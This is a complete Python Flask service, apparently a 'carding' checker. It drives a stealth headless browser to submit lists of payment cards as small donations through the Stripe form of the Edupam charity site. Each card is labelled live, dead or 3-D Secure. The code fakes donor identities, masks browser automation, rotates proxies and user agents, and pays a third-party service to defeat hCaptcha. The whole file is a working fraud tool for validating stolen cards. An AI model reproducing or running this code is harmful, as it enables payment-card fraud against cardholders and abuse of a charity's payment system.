from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import threading
import time
import asyncio
import random
import string
import logging
import base64
import datetime
from datetime import datetime as dt
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
import requests

# Configuración de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ==================== CONFIGURACIÓN ====================
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
API_KEY_ANTICAPTCHA = os.environ.get('API_KEY_ANTICAPTCHA', '')
API_KEY_CAPSOLVER = os.environ.get('API_KEY_CAPSOLVER', '')
EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', '')
EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', '')
EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', '')
EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))
PROXY_SERVER = os.environ.get('PROXY_SERVER', '')
PROXY_USERNAME = os.environ.get('PROXY_USERNAME', '')
PROXY_PASSWORD = os.environ.get('PROXY_PASSWORD', '')

# Variables globales de estado
checking_status = {
    'active': False,
    'processed': 0,
    'live': 0,
    'decline': 0,
    'threeds': 0,
    'error': 0,
    'current': '',
    'results': [],
    'loop': None,
    'task': None,
    'stop_on_live': False
}

# ==================== UTILIDADES ====================
def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
    ]
    return random.choice(agents)

def get_random_name():
    names = ["Juan","Jose","Luis","Carlos","Miguel","Maria","Ana","Laura","Carmen","Sofia"]
    lastnames = ["Garcia","Martinez","Lopez","Gonzalez","Rodriguez","Fernandez","Perez","Sanchez","Ramirez","Torres"]
    return random.choice(names), random.choice(lastnames)

def get_random_birthdate():
    start = dt(1964, 1, 1)
    end = dt(2004, 12, 31)
    delta = (end - start).days
    rand_days = random.randint(0, delta)
    return (start + datetime.timedelta(days=rand_days)).strftime("%Y-%m-%d")

STEALTH_JS = """
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    Object.defineProperty(navigator, 'languages', { get: () => ['es-ES', 'es', 'en-US', 'en'] });
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
"""

# ==================== CAPTCHA SOLVER (async wrapper) ====================
async def solve_captcha_api_async(page_url, sitekey):
    """Resuelve hCaptcha usando 2Captcha (bloqueante, ejecutado en thread)"""
    if not API_KEY_2CAPTCHA:
        logger.warning("No API key for 2Captcha")
        return None
    
    def _solve():
        try:
            # Crear tarea
            data = {
                "clientKey": API_KEY_2CAPTCHA,
                "task": {
                    "type": "HCaptchaTaskProxyless",
                    "websiteURL": page_url,
                    "websiteKey": sitekey,
                    "isInvisible": False
                }
            }
            resp = requests.post("https://api.2captcha.com/createTask", json=data, timeout=30)
            result = resp.json()
            if result.get("errorId", 1) != 0:
                logger.error(f"2Captcha error: {result.get('errorDescription')}")
                return None
            task_id = result["taskId"]
            logger.info(f"2Captcha task created: {task_id}")
            
            for _ in range(30):
                time.sleep(5)
                resp2 = requests.post("https://api.2captcha.com/getTaskResult", json={"clientKey": API_KEY_2CAPTCHA, "taskId": task_id}, timeout=30)
                status = resp2.json()
                if status.get("status") == "ready":
                    token = status.get("solution", {}).get("gRecaptchaResponse")
                    if token:
                        logger.info("✅ hCaptcha resuelto")
                        return token
                elif status.get("status") == "processing":
                    continue
                else:
                    logger.error(f"2Captcha error: {status}")
                    return None
            return None
        except Exception as e:
            logger.error(f"2Captcha exception: {e}")
            return None
    
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, _solve)

async def solve_captcha_if_present(page):
    """Detecta hCaptcha y lo resuelve usando 2Captcha"""
    try:
        sitekey = None
        # Buscar en frames
        for frame in page.frames:
            url = frame.url.lower()
            if "hcaptcha.com" in url and "js.stripe.com" not in url:
                match = re.search(r'sitekey=([^&]+)', frame.url)
                if match:
                    sitekey = match.group(1)
                    logger.info(f"🧩 hCaptcha detectado (frame): {sitekey[:10]}...")
                    break
        if not sitekey:
            # Buscar en DOM
            elem = await page.query_selector('[data-sitekey]')
            if elem:
                sitekey = await elem.get_attribute('data-sitekey')
                logger.info(f"🧩 hCaptcha detectado (DOM): {sitekey[:10]}...")
        
        if sitekey:
            token = await solve_captcha_api_async(page.url, sitekey)
            if token and len(token) > 20:
                # Inyectar token
                await page.evaluate(f"""
                    (token) => {{
                        let h = document.getElementsByName('h-captcha-response');
                        if(h.length) h[0].value = token;
                        let g = document.getElementById('g-recaptcha-response');
                        if(g) g.value = token;
                        if(typeof hcaptcha !== 'undefined') {{
                            try {{ hcaptcha.setData(token); }} catch(e) {{}}
                        }}
                        document.querySelector('[name="h-captcha-response"]')?.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    }}
                """, token)
                logger.info("✅ Token inyectado")
                await asyncio.sleep(2)
                return True
            else:
                logger.warning("❌ Fallo al resolver captcha")
                return False
        return True  # No captcha
    except Exception as e:
        logger.error(f"Error en solve_captcha: {e}")
        return False

# ==================== CLASE EDU SESSION (ASYNCIO) ====================
class EduSession:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        self.is_open = False
        self.proxy = None
        if PROXY_SERVER:
            self.proxy = {"server": PROXY_SERVER}
            if PROXY_USERNAME and PROXY_PASSWORD:
                self.proxy["username"] = PROXY_USERNAME
                self.proxy["password"] = PROXY_PASSWORD

    async def start_browser(self):
        await self.close()
        try:
            self.playwright = await async_playwright().start()
            logger.info("🚀 Iniciando navegador (EduSession ASYNC)...")
            launch_options = {
                "headless": HEADLESS,
                "slow_mo": 50,
            }
            if self.proxy:
                launch_options["proxy"] = self.proxy
            self.browser = await self.playwright.chromium.launch(**launch_options)
            self.context = await self.browser.new_context(
                user_agent=get_random_user_agent(),
                viewport={'width': 1280, 'height': 720},
                locale="es-MX",
                timezone_id="America/Mexico_City"
            )
            await self.context.add_init_script(STEALTH_JS)
            self.page = await self.context.new_page()
            self.is_open = True
            url = f"{EDUPAM_BASE_URL}{EDUPAM_ENDPOINT}"
            logger.info(f"Navegando a {url}...")
            await self.page.goto(url, timeout=60000, wait_until="domcontentloaded")
            return True
        except Exception as e:
            logger.error(f"Error start_browser: {e}")
            await self.close()
            return False

    async def close(self):
        if self.page:
            try: await self.page.close()
            except: pass
        if self.context:
            try: await self.context.close()
            except: pass
        if self.browser:
            try: await self.browser.close()
            except: pass
        if self.playwright:
            try: await self.playwright.stop()
            except: pass
        self.page = None
        self.context = None
        self.browser = None
        self.playwright = None
        self.is_open = False

    async def process_card(self, card_string, amount=None):
        """Procesa una tarjeta, devuelve resultado con status LIVE/DEAD/3DS/ERROR"""
        if not self.is_open or not self.page:
            if not await self.start_browser():
                return {"status": "ERROR", "message": "Browser init failed", "card": "****"}
        
        page = self.page
        stripe_data = {"status": None, "body": None}
        
        # Listener de respuestas Stripe
        async def handle_response(response):
            if "api.stripe.com" in response.url and "confirm" in response.url:
                try:
                    if "application/json" in response.headers.get("content-type", ""):
                        stripe_data["body"] = await response.json()
                    else:
                        stripe_data["body"] = await response.text()
                except:
                    pass
        
        # Registrar listener
        page.on("response", handle_response)
        
        # Parsear tarjeta
        parts = card_string.strip().split('|')
        if len(parts) < 4:
            return {"status": "ERROR", "message": "Formato inválido", "card": card_string[:4]+"****"}
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = "20" + yy
        card_last4 = cc_num[-4:]
        
        try:
            # Si la URL no es la correcta, navegar
            current_url = page.url.rstrip('/')
            target_url = f"{EDUPAM_BASE_URL}{EDUPAM_ENDPOINT}".rstrip('/')
            if current_url != target_url:
                await page.goto(target_url, timeout=40000)
            else:
                await page.reload()
            
            # Esperar formulario
            await page.wait_for_selector('input[name="name"]', timeout=60000)
            
            # Datos aleatorios o fijos
            if EDUPAM_DONOR_NAME and EDUPAM_DONOR_LASTNAME:
                name = EDUPAM_DONOR_NAME
                lastname = EDUPAM_DONOR_LASTNAME
            else:
                name, lastname = get_random_name()
            
            if EDUPAM_DONOR_EMAIL:
                email = EDUPAM_DONOR_EMAIL
            else:
                email = f"{name.lower()}.{lastname.lower()}{random.randint(10,999)}@gmail.com"
            
            birthdate = get_random_birthdate()
            donation_amount = amount if amount else DONATION_AMOUNT
            # Si se permite rango aleatorio, descomentar:
            # donation_amount = random.randint(10, 50)
            
            await page.fill('input[name="name"]', name)
            await page.fill('input[name="lastname"]', lastname)
            await page.fill('input[name="email"]', email)
            await page.fill('input[name="birthdate"]', birthdate)
            await page.fill('input[name="quantity"]', str(donation_amount))
            
            # Seleccionar tipo de donación (si existe)
            if await page.is_visible('#dr-type'):
                await page.click('#dr-type')
            elif await page.is_visible('input#r-type'):
                await page.check('input#r-type', force=True)
            
            # Stripe iframe
            stripe_frame = page.frame_locator("iframe[name^='__privateStripeFrame']").first
            if not stripe_frame:
                stripe_frame = page.frame_locator("#card-element iframe")
            
            await stripe_frame.locator('input[name="cardnumber"]').fill(cc_num)
            await stripe_frame.locator('input[name="exp-date"]').fill(mm + yy[-2:])
            await stripe_frame.locator('input[name="cvc"]').fill(cvv)
            if await stripe_frame.locator('input[name="postal"]').count() > 0:
                await stripe_frame.locator('input[name="postal"]').fill("11000")
            
            # Click en botón de donación
            try:
                await page.click('#btn-donation')
            except:
                await page.evaluate("document.querySelector('#btn-donation').click()")
            
            await asyncio.sleep(3)
            
            # Resolver captcha si aparece (solo si tenemos API key)
            if API_KEY_2CAPTCHA:
                await solve_captcha_if_present(page)
            
            # Polling de resultado (hasta 180 segundos)
            end_time = time.time() + 180
            final_status = "UNKNOWN"
            final_message = "Timeout"
            
            while time.time() < end_time:
                try:
                    # 1. URL de éxito
                    if "success" in page.url or "gracias" in page.url:
                        final_status = "LIVE"
                        final_message = "Redirección a página de éxito"
                        break
                    
                    # 2. Respuesta de Stripe API
                    if stripe_data["body"]:
                        body = stripe_data["body"]
                        if isinstance(body, dict):
                            if "error" in body:
                                err = body["error"]
                                code = err.get("code", "")
                                if "card_declined" in code:
                                    final_status = "DEAD"
                                    final_message = err.get("message", "Tarjeta declinada")
                                elif "expired_card" in code or "incorrect_number" in code:
                                    final_status = "DEAD"
                                    final_message = err.get("message", "Tarjeta inválida")
                                else:
                                    final_status = "DEAD"
                                    final_message = err.get("message", "Error de pago")
                                break
                            elif body.get("status") == "succeeded":
                                final_status = "LIVE"
                                final_message = "Pago exitoso (Stripe)"
                                break
                    
                    # 3. Mensaje visible en página (validación rápida)
                    try:
                        msg_elem = page.locator('#message')
                        if await msg_elem.count() > 0 and await msg_elem.is_visible():
                            msg_text = await msg_elem.inner_text()
                            msg_lower = msg_text.lower()
                            if any(x in msg_lower for x in ["error", "por favor", "problema", "inválida", "incorrect", "falló"]):
                                final_status = "DEAD"
                                final_message = msg_text.strip()[:200]
                                break
                            elif any(x in msg_lower for x in ["éxito", "exitoso", "realizado"]):
                                final_status = "LIVE"
                                final_message = msg_text.strip()
                                break
                    except:
                        pass
                    
                    # 4. Detectar 3D Secure en frames
                    three_ds_keywords = ["acs", "3dsecure", "cardinal", "centinel", "challenge", "verification"]
                    for frame in page.frames:
                        frame_url = frame.url.lower()
                        if any(k in frame_url for k in three_ds_keywords) and "hcaptcha" not in frame_url:
                            final_status = "3DS"
                            final_message = "3D Secure detectado"
                            break
                    if final_status != "UNKNOWN":
                        break
                    
                    # 5. Texto en el body (declinación genérica)
                    content = await page.content()
                    content_lower = content.lower()
                    if "card was declined" in content_lower or "tarjeta rechazada" in content_lower:
                        final_status = "DEAD"
                        final_message = "Declinación detectada en página"
                        break
                    
                except Exception as loop_e:
                    err_str = str(loop_e).lower()
                    if "closed" in err_str or "connection" in err_str:
                        raise loop_e
                
                await asyncio.sleep(1)
            
            # Mapear estados finales
            status_map = {
                "LIVE": "LIVE",
                "DEAD": "DEAD",
                "3DS": "3DS",
                "UNKNOWN": "ERROR"
            }
            final_code = status_map.get(final_status, "ERROR")
            
            result = {
                "success": final_code != "ERROR",
                "status": final_code,
                "original_status": final_message,
                "message": final_message,
                "card": f"****{card_last4}",
                "gate": "Edupam",
                "amount": donation_amount,
                "timestamp": dt.now().isoformat(),
                "response": {
                    "url": page.url,
                    "evidence": final_message
                }
            }
            return result
            
        except Exception as e:
            logger.error(f"Error procesando tarjeta ****{card_last4}: {e}")
            return {
                "success": False,
                "status": "ERROR",
                "message": str(e)[:200],
                "card": f"****{card_last4}"
            }
        finally:
            # Remover listener
            try:
                page.remove_listener("response", handle_response)
            except:
                pass

# ==================== WORKER ASYNC ====================
async def process_cards_async(cards, amount, stop_on_live):
    global checking_status
    session = EduSession()
    try:
        if not await session.start_browser():
            logger.error("No se pudo iniciar el navegador")
            checking_status['active'] = False
            return
        
        for idx, card_line in enumerate(cards):
            if not checking_status['active']:
                break
            
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': idx+1,
                    'card': 'INVALID',
                    'status': 'ERROR',
                    'message': 'Formato inválido'
                })
                continue
            
            last4 = parts[0][-4:] if len(parts[0]) >= 4 else '????'
            checking_status['current'] = f"****{last4}"
            logger.info(f"Procesando tarjeta {idx+1}/{len(cards)}: ****{last4}")
            
            result = await session.process_card(card_line, amount)
            
            card_result = {
                'id': idx+1,
                'card': result.get('card', f"****{last4}"),
                'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': result.get('gate', 'Edupam'),
                'amount': amount,
                'timestamp': dt.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False)
            }
            
            checking_status['processed'] += 1
            checking_status['results'].append(card_result)
            
            if result.get('status') == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif result.get('status') == 'DEAD':
                checking_status['decline'] += 1
            elif result.get('status') == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1
            
            await asyncio.sleep(2)
            
    except Exception as e:
        logger.error(f"Error en worker: {e}")
    finally:
        await session.close()
        checking_status['active'] = False

def run_async_worker(cards, amount, stop_on_live):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(process_cards_async(cards, amount, stop_on_live))
    finally:
        loop.close()

# ==================== ENDPOINTS FLASK ====================
@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "service": "Lattice Checker API (Edupam) - Async",
        "version": "3.0",
        "endpoints": {
            "health": "/api/health",
            "status": "/api/status",
            "check_card": "/api/check-card (POST)",
            "check_cards": "/api/check (POST)",
            "results": "/api/results",
            "cancel": "/api/cancel (POST)"
        },
        "config": {
            "headless": HEADLESS,
            "donation_amount": DONATION_AMOUNT,
            "max_workers": MAX_WORKERS,
            "proxy": "enabled" if PROXY_SERVER else "disabled",
            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'online',
        'service': 'Lattice Checker API Async',
        'version': '3.0',
        'timestamp': dt.now().isoformat(),
        'features': {
            '2captcha': bool(API_KEY_2CAPTCHA),
            'proxy': bool(PROXY_SERVER),
            'async_playwright': True
        }
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify({
        'active': checking_status['active'],
        'processed': checking_status['processed'],
        'live': checking_status['live'],
        'decline': checking_status['decline'],
        'threeds': checking_status['threeds'],
        'error': checking_status['error'],
        'current': checking_status['current'],
        'total': len(checking_status['results'])
    })

@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    card_data = data.get('card', '')
    if not card_data or '|' not in card_data:
        return jsonify({'error': 'Formato inválido'}), 400
    
    # Ejecutar en un loop asyncio temporal
    async def _check():
        session = EduSession()
        try:
            if await session.start_browser():
                return await session.process_card(card_data, DONATION_AMOUNT)
            return {'status': 'ERROR', 'message': 'Browser init failed'}
        finally:
            await session.close()
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(_check())
    finally:
        loop.close()
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check_cards():
    global checking_status
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    cards = data.get('cards', [])
    amount = data.get('amount', DONATION_AMOUNT)
    stop_on_live = data.get('stop_on_live', False)
    
    if not cards:
        return jsonify({'error': 'No hay tarjetas'}), 400
    
    valid_cards = [c for c in cards if '|' in c and len(c.split('|')) >= 4]
    if not valid_cards:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    
    checking_status = {
        'active': True,
        'processed': 0,
        'live': 0,
        'decline': 0,
        'threeds': 0,
        'error': 0,
        'current': '',
        'results': [],
        'stop_on_live': stop_on_live
    }
    
    thread = threading.Thread(target=run_async_worker, args=(valid_cards, amount, stop_on_live))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'success': True,
        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
        'total': len(valid_cards),
        'amount': amount
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'],
            'decline': checking_status['decline'],
            'threeds': checking_status['threeds'],
            'error': checking_status['error']
        }
    })

@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    global checking_status
    checking_status['active'] = False
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})

# ==================== INICIO ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
    logger.info(f"🚀 Servidor iniciado en puerto {port}")
    logger.info(f"🔧 Headless: {HEADLESS}, Proxy: {'Sí' if PROXY_SERVER else 'No'}")
    logger.info(f"🧩 2Captcha: {'Habilitado' if API_KEY_2CAPTCHA else 'Deshabilitado'}")
    app.run(host='0.0.0.0', port=port, debug=debug)